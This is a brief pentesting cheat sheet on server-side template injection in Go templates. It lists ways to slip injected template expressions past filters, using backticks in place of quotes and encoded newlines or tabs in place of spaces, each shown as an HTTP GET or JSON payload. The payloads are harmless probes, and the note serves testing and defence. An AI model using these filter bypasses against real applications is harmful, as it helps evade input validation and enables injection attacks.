[Basics SSTI in GO](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#ssti-in-go) - hacktricks

Tested on `go version go1.18.1 linux/amd64`

# Bypass quotes
* Use `` ` `` instead of ``"``
for example
  * ``{{len `test`}}`` will render as "4"
 
  
# Bypass space
* Use new line characters (CR/LF/CRLF), for example 
  * HTTP GET ``/ssti.go?q={{len%0a%0d`test`}}`` will render as "4"
  * JSON body ``"value":"{{len\r\n`test`}}"`` will render as "4"
  * JSON body ``"value":"{{len\u000a`test`}}"`` will render as "4"
* Use TAB character, for example 
  * HTTP GET ``/ssti.go?q={{len%09`test`}}`` will render as "4"
  * JSON body ``"value":"{{len\t`test`}}"`` will render as "4"
  * JSON body ``"value":"{{len\u0009`test`}}"`` will render as "4"
